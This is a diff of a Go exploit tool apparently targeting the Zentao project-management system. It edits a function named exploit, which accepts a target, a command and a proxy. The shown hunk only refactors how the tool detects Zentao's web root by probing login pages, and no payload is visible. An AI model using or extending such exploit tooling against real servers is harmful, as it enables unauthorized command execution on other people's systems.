@@ -118,6 +118,7 @@ func exploit(target string, command string, proxyURL string) bool {
 	// 1. 确定正确完整的Zentao baseURL
 	u, _ := url.Parse(target)
 	paths := []string{"/", "/zentao/"}
+	foundPath := false
 
 	userAgent := "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5408.146 Safari/537.36"
 
@@ -128,15 +129,16 @@ func exploit(target string, command string, proxyURL string) bool {
 			SetHeader("User-Agent", userAgent).
 			Get(baseURL)
 
-		if !strings.Contains(string(baseResp.Body()), "/user-login") {
-			continue
-		} else if baseResp.StatusCode() == 200 && strings.Contains(string(baseResp.Body()), "/user-login") {
-			gologger.Print().Label("INFO").Msg("Zentao WebRoot Path: " + baseURL)
+		if baseResp.StatusCode() == 200 && strings.Contains(string(baseResp.Body()), "/user-login") {
+			foundPath = true
 			break
 		}
-
+	}
+	if !foundPath {
 		baseURL = target
 		gologger.Print().Label("WARN").Msg("Zentao WebRoot Path not found, target URL instead.")
+	} else {
+		gologger.Print().Label("INFO").Msg("Zentao WebRoot Path: " + baseURL)
 	}
 
 	// 2. 获取请求类型
